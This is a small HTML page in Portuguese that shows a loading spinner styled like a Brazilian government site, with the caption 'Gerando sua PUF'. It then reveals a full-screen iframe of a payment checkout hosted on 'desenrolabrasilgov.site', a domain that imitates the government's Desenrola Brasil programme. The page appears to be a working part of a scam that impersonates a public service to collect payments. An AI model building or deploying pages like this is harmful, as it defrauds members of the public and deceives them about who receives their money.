<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando</title>

</head>
<body style="margin:0;">
    <style>
        .loader {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        background: #ffffff;
        transition: opacity 0.75s, visibility 0.75s;
        }

        .loader--hidden {
        opacity: 0;
        visibility: hidden;
        display:none;
        }
        .hidden {
            display: none;
        }

        .loader::after {
        content: "";
        width: 75px;
        height: 75px;
        border: 15px solid #dddddd;
        border-top-color: #1351B4;
        border-radius: 50%;
        animation: loading 0.75s ease infinite;
        }

        @keyframes loading {
        from {
            transform: rotate(0turn);
        }
        to {
            transform: rotate(1turn);
        }
        }

    </style>
    <script>
        window.addEventListener("load", async () => {
            const loader = document.querySelector(".loader");
            const checkout =document.querySelector('#checkout')

            await new Promise((resolve) => {
                setTimeout(() => {
                    resolve(true)
                }, 933);
            })
            loader.classList.add("loader--hidden");
            loader.classList.remove("loader");
            checkout.classList.remove("hidden");
            loader.addEventListener("transitionend", () => {
                document.body.removeChild(loader);
            });
            });

    </script>
    <div class="loader">
            <h1 style="
            font-family: 'Arial';
        ">Gerando sua PUF</h1>

</div>
<iframe id="checkout" class="hidden" src="https://pay.desenrolabrasilgov.site/6YQPgjY06bLGpxz" style="width: 100%; height: 100vh;" >     

</body>
</html>